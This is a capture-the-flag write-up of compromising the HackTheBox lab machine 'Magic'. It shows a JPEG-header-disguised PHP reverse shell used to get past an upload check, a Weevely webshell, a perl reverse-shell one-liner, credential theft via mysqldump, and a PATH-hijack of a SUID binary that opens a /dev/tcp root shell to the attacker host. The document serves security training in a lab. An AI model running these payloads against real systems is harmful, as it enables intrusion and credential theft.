# Magic | HackTheBox

### 1. Scan
```bash
kali@kali:~$ sudo nmap -A -p- -T4 10.10.10.185
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-12 21:34 EDT
Warning: 10.10.10.185 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.185
Host is up (0.33s latency).
Not shown: 65492 closed ports, 41 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/12%OT=22%CT=1%CU=30394%PV=Y%DS=2%DC=T%G=Y%TM=5F34A0D
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=C)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   327.21 ms 10.10.14.1
2   327.21 ms 10.10.10.185

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2092.86 seconds
```
The machine is running OpenSSH 7.6p1 and Apache 2.4.29.

### 2. Enumeration
Checking out the website, it is a magic-themed site with a few pages and a login form. The login form seems pretty standard.  
The main page features a message "Please Login, to upload images." so I know there is an upload functionality somewhere on the site behind the login form. However as there does not appear to be anything wrong with how the actual login functionality works, and there is not enough information to attempt an effective brute force, I go back to enumeration.  
Fuzzing for PHP files shows there is an upload.php present on the server.
```bash
kali@kali:~$ wfuzz -c --hs 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.185/FUZZ.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.185/FUZZ.php
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                       
===================================================================

000000003:   200        59 L     290 W    6386 Ch     "# Copyright 2007 James Fisher"                                               
000000001:   200        59 L     290 W    6387 Ch     "# directory-list-2.3-medium.txt"                                             
000000002:   200        59 L     290 W    6392 Ch     "#"                                                                           
000000004:   200        59 L     290 W    6386 Ch     "#"                                                                           
000000005:   200        59 L     290 W    6391 Ch     "# This work is licensed under the Creative Commons"                          
000000006:   200        59 L     290 W    6387 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"               
000000007:   200        59 L     290 W    6386 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"             
000000008:   200        59 L     290 W    6387 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                  
000000009:   200        59 L     290 W    6384 Ch     "# Suite 300, San Francisco, California, 94105, USA."                         
000000010:   200        59 L     290 W    6389 Ch     "#"                                                                           
000000011:   200        59 L     290 W    6391 Ch     "# Priority ordered case sensative list, where entries were found"            
000000012:   200        59 L     290 W    6386 Ch     "# on atleast 2 different hosts"                                              
000000013:   200        59 L     290 W    6389 Ch     "#"                                                                           
000000014:   403        9 L      28 W     277 Ch      ""                                                                            
000000015:   200        59 L     290 W    6390 Ch     "index"                                                                       
000000053:   200        117 L    277 W    4221 Ch     "login"                                                                       
000000366:   302        84 L     177 W    2957 Ch     "upload"                                                                      
000001225:   302        0 L      0 W      0 Ch        "logout"
```

Going to the page, I get redirected to the login form. However in my proxy, I can see the response did return the code for the upload page, including the form that allows files to be uploaded to the server.
```html
<form action="" method="POST" enctype="multipart/form-data">
                    <div class="dropzone">
                        <div class="content">
                            <img src="https://100dayscss.com/codepen/upload.svg" class="upload">
                            <span class="filename"></span>
                            <input type="file" class="input" name="image">
                        </div>
                    </div>
                    <input class="upload-btn" type="submit" value="Upload Image" name="submit">
                </form>
```
With this information I should be able to post form data and upload my own file.

### 3. Get a shell
My plan is as follows:
1. Post an image to the upload.php address so the file appears on the server
2. Access the file via the homepage to open a shell to my machine.
  
Firstly I will clone the page and change the form action so it posts to the site.
```bash
kali@kali:~/Desktop/htb/magic$ cloner -u http://10.10.10.185/upload.php -f http://10.10.10.185
============================================================
                           cloner
============================================================
Cloning page: http://10.10.10.185/upload.php
Getting content: http://10.10.10.185/assets/js/jquery.min.js - Success
Getting content: http://10.10.10.185/assets/js/jquery.poptrox.min.js - Success
Getting content: http://10.10.10.185/assets/js/browser.min.js - Success
Getting content: http://10.10.10.185/assets/js/breakpoints.min.js - Success
Getting content: http://10.10.10.185/assets/js/util.js - Success
Getting content: http://10.10.10.185/assets/js/main.js - Success
Building page...
Performing form action substitution with: http://10.10.10.185/upload.php
Site cloned to ./cloned-2020-08-13-01-17-06
```
Once I have a copy of the page, I clean it up a bit (cloner is still a bit buggy with how it replaces relative stuff). I upload a test file to the site and capture the response in Burp.
```html
HTTP/1.1 302 Found
Date: Thu, 13 Aug 2020 06:53:55 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 3015
Connection: close
Content-Type: text/html; charset=UTF-8

<script>alert('Sorry, only JPG, JPEG & PNG files are allowed.')</script>
```
If I find an actual jpg file (the first test file I used wasn't one of these formats) and try it, it uploads successfully.
```
The file pepe.jpeg has been uploaded.
```
After a few more checks it becomes apparent that the upload is allowed based on the file's header. I know this can be bypassed, as headers can be appended to any file. I create a php reverse shell with a JPEG header.
```bash
kali@kali:~/Desktop/htb/magic$ file pepeshell.php.jpeg 
pepeshell.php: JPEG image data, JFIF standard 1.10, density 16240x26736, segment length 16, thumbnail 32x101
kali@kali:~/Desktop/htb/magic$ cat pepeshell.php.jpeg
����JFIF
<?php eval('$sock=fsockopen("10.10.15.116",9999);exec("/bin/sh -i <&3 >&3 2>&3");'); ?>
```
I then upload this, and it successfully passes through the filters to be uploaded.
```
The file pepeshell.php.jpeg has been uploaded.
```
Now I can browse to the file on the server to execute the shell. Unfortunately this doesn't end up working - the connection gets recieved but immediately drops. I try a webshell generated in Weevely next.
```bash
kali@kali:~$ weevely generate jack pepeshell.php
Generated 'pepemegashell.php' with password 'jack' of 680 byte size.
kali@kali:~$ bless pepeshell.php
```
I then edit this shell to have the .jpeg extension and add the JPEG header to the front of it: `FF D8 FF E0 00 10 4A 46 49 46 00 01`  
Then I connect to the shell.
```bash
kali@kali:~/Desktop/htb/magic$ weevely http://10.10.10.185/images/uploads/pepeshell.php.jpeg jack

[+] weevely 4.0.1

[+] Target:     10.10.10.185
[+] Session:    /home/kali/.weevely/sessions/10.10.10.185/pepeshell.php_1.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> whoami
www-data
www-data@ubuntu:/var/www/Magic/images/uploads $
```
This shell appears to persist, however, for some reason it does die after 5 mins each time. Therefore I will keep trying to get something more persistant before diving into enumeration.
```bash
www-data@ubuntu:/var/www/Magic $ :backdoor_reversetcp
error: the following arguments are required: lhost, port
usage: backdoor_reversetcp [-h] [-shell SHELL] [-no-autonnect] [-vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}]
                           lhost port

Execute a reverse TCP shell.

positional arguments:
  lhost                 Local host
  port                  Port to spawn

optional arguments:
  -h, --help            show this help message and exit
  -shell SHELL          Specify shell
  -no-autonnect         Skip autoconnect
  -vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}
www-data@ubuntu:/var/www/Magic $ which python
www-data@ubuntu:/var/www/Magic $ which nc
www-data@ubuntu:/var/www/Magic $ which perl
/usr/bin/perl
www-data@ubuntu:/var/www/Magic $ :backdoor_reversetcp -shell /bin/bash -vector perl 10.10.15.116 9999
Reverse shell connected, insert commands. Append semi-colon help to get the commands accepted.
bash: cannot set terminal process group (1143): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/Magic$
```
This reverse shell is totally persistant but is still a bit glitchy, so from here I spawn another perl reverse shell (and close the old ones after).
```bash
www-data@ubuntu:/home$ perl -e 'use Socket;$i="10.10.15.116";$p=9998;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
Catch the new shell in netcat:
```bash
kali@kali:~$ nc -lvp 9998
Listening on 0.0.0.0 9998
Connection received on 10.10.10.185 42452
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
Now I'm good to start enumerating.

### 4. Enumeration
As usual I start my enumeration from /var/www and work back from there.
```bash
ls -R
.:
Magic  html

./Magic:
assets   images     linenum-output.txt  logout.php
db.php5  index.php  login.php           upload.php

./Magic/assets:
css  js  sass  webfonts

./Magic/assets/css:
fontawesome-all.min.css  images  main.css  noscript.css  upload.css

./Magic/assets/css/images:
arrow.svg  ie  loader.gif  overlay.png

./Magic/assets/css/images/ie:
banner-overlay.png

./Magic/assets/js:
breakpoints.min.js  jquery.min.js          main.js    util.js
browser.min.js      jquery.poptrox.min.js  upload.js

./Magic/assets/sass:
libs  main.scss  noscript.scss

./Magic/assets/sass/libs:
_breakpoints.scss  _functions.scss  _mixins.scss  _vars.scss  _vendor.scss

./Magic/assets/webfonts:
fa-brands-400.eot    fa-regular-400.eot    fa-solid-900.eot
fa-brands-400.svg    fa-regular-400.svg    fa-solid-900.svg
fa-brands-400.ttf    fa-regular-400.ttf    fa-solid-900.ttf
fa-brands-400.woff   fa-regular-400.woff   fa-solid-900.woff
fa-brands-400.woff2  fa-regular-400.woff2  fa-solid-900.woff2

./Magic/images:
bg.jpg  fulls  hey.jpg  uploads

./Magic/images/fulls:
1.jpg  2.jpg  3.jpg  5.jpeg  6.jpg

./Magic/images/uploads:
 1.jpg                                   logo.png
 7.jpg                                   lol.jpg
'Linux Privilege Escalation Paths.png'   magic-1424x900.jpg
 giphy.gif                               magic-hat_23-2147512156.jpg
 image-analysis.png                      magic-wand.jpg
 image.png                               trx.jpg
 lllx.jpg                                wglegion.jpg
```
Ignoring the image files, there ain't a whole lot of extra files. However I can still get the backend source code of the site and inspect it, starting with login.php.
```php
<?php
session_start();
require 'db.php5';
if (!empty($_POST['username'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    if (strpos( strtolower($username), 'sleep') === false && strpos( strtolower($password), 'sleep') === false && strpos( strtolower($username), 'benchmark') === false && strpos( strtolower($password), 'benchmark') === false) {
        try {
            $pdo = Database::connect();
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);
            $stmt = $pdo->query("SELECT * FROM login WHERE username='$username' AND password='$password'");
            $user = $stmt->fetch();
            $count = 0;
            foreach ($user as $value) {
                $count += 1;
            }
            Database::disconnect();
            if ($count > 0) {
                $_SESSION['user_id'] = $user->id;
                header("Location: upload.php");
            } else {
                print("<script>alert('Wrong Username or Password')</script>");
                //print('Wrong Username or Password');
            }
        } catch (PDOException $e) {
            //echo "Error: " . $e->getMessage();
            //echo "An SQL Error occurred!";
        }
    }
}
?>
```
This php code includes db.php5, so we can take a look at that as well.
```php
<?php                                                                                                                                               
class Database                                                                                                                                            
{                                                                                                                                                                
    private static $dbName = 'Magic' ;                 
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';                                                     
    private static $cont  = null;                                                                                                                                                     
                                                                                                                                                                                      
    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```
Here there is some hardcoded creds for a user - `theseus:iamkingtheseus` to connect to the database. There is also a user called theseus on the machine.
```bash
www-data@ubuntu:/var/www/Magic$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
sshd:x:123:65534::/run/sshd:/usr/sbin/nologin
mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false
```
However, these creds do not work when I try to use su to access theseus's account. Before moving on to try other stuff, I'll look at the rest of the files.
```php
www-data@ubuntu:/var/www/Magic$ cat upload.php
<?php
session_start();

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
}
$target_dir = "images/uploads/";
$target_file = $target_dir . basename($_FILES["image"]["name"]);
$uploadOk = 1;
$allowed = array('2', '3');

// Check if image file is a actual image or fake image
if (isset($_POST["submit"])) {
    // Allow certain file formats
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
    if ($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
        echo "<script>alert('Sorry, only JPG, JPEG & PNG files are allowed.')</script>";
        $uploadOk = 0;
    }

    if ($uploadOk === 1) {
        // Check if image is actually png or jpg using magic bytes
        $check = exif_imagetype($_FILES["image"]["tmp_name"]);
        if (!in_array($check, $allowed)) {
            echo "<script>alert('What are you trying to do there?')</script>";
            $uploadOk = 0;
        }
    }
    //Check file contents
    /*$image = file_get_contents($_FILES["image"]["tmp_name"]);
    if (strpos($image, "<?") !== FALSE) {
        echo "<script>alert('Detected \"\<\?\". PHP is not allowed!')</script>";
        $uploadOk = 0;
    }*/

    // Check if $uploadOk is set to 0 by an error
    if ($uploadOk === 1) {
        if (move_uploaded_file($_FILES["image"]["tmp_name"], $target_file)) {
            echo "The file " . basename($_FILES["image"]["name"]) . " has been uploaded.";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }
}
?>
```
This pretty much just confirms the functaionality of the image upload, using exif_imagetype to check the file header along with the extension.
  
Moving on from here, I can probably log in to the database somehow using those creds and see whats happening in there.
```bash
www-data@ubuntu:/usr/bin$ ls /usr/bin | grep mysql
mysql_config_editor
mysql_embedded
mysql_install_db
mysql_plugin
mysql_secure_installation
mysql_ssl_rsa_setup
mysql_tzinfo_to_sql
mysql_upgrade
mysqladmin
mysqlanalyze
mysqlbinlog
mysqlcheck
mysqld_multi
mysqld_safe
mysqldump
mysqldumpslow
mysqlimport
mysqloptimize
mysqlpump
mysqlrepair
mysqlreport
mysqlshow
mysqlslap
www-data@ubuntu:/usr/bin$ mysqlshow --user=theseus --password=iamkingtheseus Magic
<show --user=theseus --password=iamkingtheseus Magic
mysqlshow: [Warning] Using a password on the command line interface can be insecure.
Database: Magic
+--------+
| Tables |
+--------+
| login  |
+--------+
www-data@ubuntu:/usr/bin$ mysqlshow --user=theseus --password=iamkingtheseus Magic login
<-user=theseus --password=iamkingtheseus Magic login
mysqlshow: [Warning] Using a password on the command line interface can be insecure.
Database: Magic  Table: login
+----------+--------------+-------------------+------+-----+---------+----------------+---------------------------------+---------+
| Field    | Type         | Collation         | Null | Key | Default | Extra          | Privileges                      | Comment |
+----------+--------------+-------------------+------+-----+---------+----------------+---------------------------------+---------+
| id       | int(6)       |                   | NO   | PRI |         | auto_increment | select,insert,update,references |         |
| username | varchar(50)  | latin1_swedish_ci | NO   | UNI |         |                | select,insert,update,references |         |
| password | varchar(100) | latin1_swedish_ci | NO   |     |         |                | select,insert,update,references |         |
+----------+--------------+-------------------+------+-----+---------+----------------+---------------------------------+---------+
```
The mysql binary is missing so I can't interact with the database through that, but there are other means of getting the data out.
```bash
www-data@ubuntu:/usr/bin$ mysqldump --user=theseus --password=iamkingtheseus Magic login
<-user=theseus --password=iamkingtheseus Magic login
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-08-13 19:25:07
```
There I can see there is a second set of credentials for the user - `admin:Th3s3usW4sK1ng`.

### 5. Escalate privileges
Now I can try using su with this new password.
```bash
www-data@ubuntu:/$ su - theseus
su - theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:~$ 
```
Now I have access to the theseus user.

### 6. More enumeration
To be honest, enumeration from this user is made easy due to the huge number of enum scripts others have left just lying around. Why run the same thing again when someone else has already done it and left the output in a file right in the home directory? (see linenum_out.txt, linpeas_out.txt).
I spend a while going through the outputs investigating different stuff. One thing that stood out to me was the /bin/sysinfo binary which was owned by root and readable by me, which is something I didn't remember seeing before on other enum script outputs for other machines, so it appeared out of the ordinary.
```bash
[+] Readable files belonging to root and readable by me but not world readable
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
```
It also has the SUID bit set.
```bash
theseus@ubuntu:~$ ls -l /bin/sysinfo
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
theseus@ubuntu:~$ cd /bin/; ./sysinfo
====================Hardware Info====================
H/W path           Device      Class      Description
=====================================================
...
```
Basically it just outputs a whole lot of info on the system to the screen. It makes sense it might need to have root privileges to access some of that information. I did some more research into this file and there is a well-known app called sysinfo from MagniCorp, however none of the config files for it are present. This appears to be something custom with the same name. I can try and do some surface analysis of it from the server.
```bash
theseus@ubuntu:/bin$ file sysinfo
sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped
theseus@ubuntu:/bin$ strings sysinfo
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
```
Running strace on the binary results on errors (I'm guessing running through a debugger messes up the permissions), but it is indeed running these commands as root to obtain the information.  
Whilst searching for each of these commands, this article caught my eye: https://hackerone.com/reports/426944
This article details a trusted $PATH vulnerability that exists in another application, but further reading shows it is also applicable in this case.
  
*. keybase-redirector is a setuid root binary. keybase-redirector calls the fusermount binary using a relative path and the application trusts the value of $PATH. This allows a local, unprivileged user to trick the application to executing a custom fusermount binary as root.*
  
As can be seen above, the programs executed to retrieve the information in this binary are also being called using their relative path. This means if I create my own program with the same name as lshw/fdisk/cat/free with whatever I want to do in it, modify the system PATH, and then run sysinfo, it should execute my program instead.

### 7. Escalate to root
Firstly I create a small bash script that will act as the substitute for the real lshw command:
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.15.116/8888 0>&1
```
All it does is connect back to me. I host this via a HTTP server on my machine. I can start my listener, then in a single line I will wget this file, give it execute permission, change the PATH variable to use /tmp first (where I'm doing this from), and run sysinfo.
```bash
theseus@ubuntu:/tmp$ wget http://10.10.15.116:8000/lshw && chmod +x lshw && export PATH=/tmp:$PATH && /bin/sysinfo
--2020-08-13 22:10:45--  http://10.10.15.116:8000/lshw
Connecting to 10.10.15.116:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 56 [application/octet-stream]
Saving to: ‘lshw’

lshw                                               100%[==============================================================================================================>]      56  --.-KB/s    in 0s      

2020-08-13 22:10:45 (9.80 MB/s) - ‘lshw’ saved [56/56]

====================Hardware Info====================


```
Catch the shell when it connects.
```bash
kali@kali:~/Desktop/htb/magic$ nc -lvnp 8888
Listening on 0.0.0.0 8888
Connection received on 10.10.10.185 35036
root@ubuntu:/bin# whoami
whoami
root
```
